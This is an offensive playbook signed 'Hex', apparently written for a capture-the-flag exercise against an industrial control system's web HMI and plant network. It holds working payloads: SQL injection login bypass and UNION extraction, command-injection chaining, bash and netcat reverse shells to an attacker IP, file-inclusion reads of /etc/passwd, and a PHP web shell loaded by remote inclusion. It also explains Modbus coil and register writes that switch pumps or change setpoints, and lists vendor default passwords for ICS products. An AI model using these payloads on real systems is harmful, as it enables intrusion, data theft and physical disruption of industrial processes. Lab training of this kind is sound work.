# ICS & Web Exploit Playbook

**Authored by: Hex**

Team,

This is our rapid-deployment playbook. No fluff. These are the high-probability attack vectors we expect to encounter on the target's Human Machine Interface (HMI) and the deeper plant-floor network. An HMI is often just a glorified web application, making it our primary entry point.

Master these techniques. Know them cold. Our success in finding and neutralizing the persistent threat depends on our speed and precision in the initial phases. We're looking for flags in the format `THM{some_text_here}`. Stay sharp.

---

## Web HMI & API Exploits

### SQL Injection (SQLi)

#### Login Bypass
This is the most classic web exploit. The goal is to manipulate the backend SQL query to always return a "true" condition, thus logging us in without valid credentials.

*   **How it Works:** The server likely runs a query like: `SELECT * FROM users WHERE username = '[our_input]' AND password = '[our_password]';`. We inject code to change this logic.
*   **Payloads:**
    *   Try this in the username field: `' OR 1=1 -- `
    *   The password field can be anything.
*   **Explanation:** The injected payload changes the query to `SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'password';`. Since `1=1` is always true, the query returns all users, and the `-- ` comments out the rest of the line, ignoring the password check. The application sees a valid user was returned and logs us in.

#### Union-Based
If a page is vulnerable to SQLi and displays data, we can use a `UNION` statement to fuse the results of our malicious query with the legitimate one, exfiltrating data directly to the webpage.

*   **Step 1: Find the number of columns.**
    *   Inject into a vulnerable parameter (e.g., `id=1' ORDER BY 1--`).
    *   Increment the number (`ORDER BY 2--`, `ORDER BY 3--`, etc.) until the page errors. The last number that worked is the column count.
*   **Step 2: Exfiltrate Data.**
    *   Assuming you found 3 columns, your payload would look like this:
    *   `' UNION SELECT 1, group_concat(username), group_concat(password) FROM users -- `
*   **Example Payload:** If the vulnerable URL is `http://10.10.123.123/staff.php?id=2`, we could try:
    *   `http://10.10.123.123/staff.php?id=-1' UNION SELECT 1,username,password FROM users--`

### Command Injection

The application is passing user input into a shell command on the backend. We can append our own commands to be executed by the server's OS.

#### Blind OS Command Injection
Use command separators to chain our command onto the end of the legitimate one.

*   **Separators:**
    *   `;` : Execute command 2 after command 1, regardless of success.
    *   `&` : Execute commands asynchronously.
    *   `&&` : Execute command 2 *only if* command 1 succeeds.
    *   `|` : Pipe the output of command 1 into command 2.
*   **Test Payload:** If a network diagnostic tool pings an IP, try this input: `8.8.8.8; whoami`. If the output shows the server's user (`www-data`, `apache`, etc.), it's vulnerable.

#### Reverse Shell Payloads
Our goal is to get a shell back to our attack machine. First, start a listener on your machine: `nc -lvnp 4242`. Then, use one of these payloads on the vulnerable target.

*   **Bash:**
    ```bash
    bash -i >& /dev/tcp/YOUR_IP/4242 0>&1
    ```
*   **Netcat (if installed):**
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4242 >/tmp/f
    ```

### File Inclusion (LFI/RFI)

#### Local File Inclusion (LFI)
The application includes a local file based on a parameter in the URL. By manipulating the path, we can read sensitive files outside the web directory.

*   **Technique:** Use path traversal (`../`) to move up directories.
*   **Linux Payloads:**
    *   `?page=../../../../etc/passwd` (List of users)
    *   `?page=../../../../var/log/apache2/access.log` (Web server logs)
*   **Windows Payloads:**
    *   `?page=../../../../boot.ini`
    *   `?page=../../../../Windows/win.ini`

#### Remote File Inclusion (RFI)
More dangerous than LFI. The server will fetch and execute a file from an external URL we control.

*   **How it Works:** Host a malicious PHP file on your attacker machine (e.g., a simple web shell).
*   **Attacker File (`shell.php`):**
    ```php
    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; } ?>
    ```
*   **Payload:**
    *   `?page=http://YOUR_ATTACKER_IP/shell.php`
*   **Usage:**
    *   `http://TARGET_IP/index.php?page=http://YOUR_ATTACKER_IP/shell.php&cmd=whoami`

---

## ICS-Specific Exploits

Once inside the OT network, the attack surface changes. These systems were built for reliability, not security. They often trust any command sent on the local network.

### Modbus Exploitation
Modbus (typically on TCP port 502) is the de-facto protocol for industrial communication. **It has no authentication or encryption.** If you can talk to a Modbus device, you own its process.

*   **Core Concept:** We can read and write values to "registers" and "coils."
    *   **Coils:** Digital On/Off values (think relays, lights, pump on/off).
    *   **Holding Registers:** 16-bit integer values (think temperature setpoints, pressure readings, valve positions).
*   **Example Manipulation:**
    *   Reading Holding Register `40001` might give you the current tank level.
    *   Writing `1` to Coil `5` might turn on a critical pump.
    *   Writing `0` to Coil `5` might turn it off.
    *   Writing a new value to Holding Register `20` could change a motor's speed setpoint.
*   **Key Modbus Function Codes:**
    *   `1`: Read Coils
    *   `3`: Read Holding Registers
    *   `5`: **Write Single Coil** (Highly impactful)
    *   `6`: **Write Single Register** (Highly impactful)

### Default Credential Abuse
Never underestimate the power of default passwords, especially on Engineering Workstations (EWS) or HMIs that have been hastily deployed.

| Vendor | Product/Software | Username | Password | Notes |
| :--- | :--- | :--- | :--- |:--- |
| Rockwell | FactoryTalk View SE | Administrator | (blank) | |
| Rockwell | RSLinx | `admin` | `password` | Check older versions. |
| Schneider | Modicon (various) | `administrator` | `password` | |
| Schneider | EcoStruxure | `administrator` | `administrator`| Also check user/user. |
| Siemens | SIMATIC S7-1200 | (none) | (none) | Access level often set to "Full access" by default. |
| Siemens | WinCC | `Administrator` | `100` | A very old but sometimes seen default. |
| Tridium | Niagara AX | `admin` | `niagara` | |